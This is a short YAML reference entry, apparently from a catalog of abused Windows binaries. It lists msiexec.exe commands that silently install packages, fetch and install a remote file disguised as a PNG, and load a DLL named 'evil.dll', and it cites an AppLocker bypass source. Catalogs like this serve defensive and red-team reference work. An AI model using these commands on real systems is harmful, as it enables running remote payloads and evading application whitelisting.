---
Name: Msiexec.exe
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: msiexec /quiet /i cmd.msi
    Description: ''
  - Command: msiexec /q /i http://192.168.100.3/tmp/cmd.png
    Description: ''
  - Command: msiexec /y "C:\folder\evil.dll"
    Description: ''
  - Command: msiexec /z "C:\folder\evil.dll"
    Description: ''
Full Path:
  - c:\windows\system32\msiexec.exe
  - c:\windows\sysWOW64\msiexec.exe
Code Sample: []
Detection: []
Resources:
  - https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
  - https://twitter.com/PhilipTsukerman/status/992021361106268161
Notes: Thanks to ? - @netbiosX, PhilipTsukerman - @PhilipTsukerman
---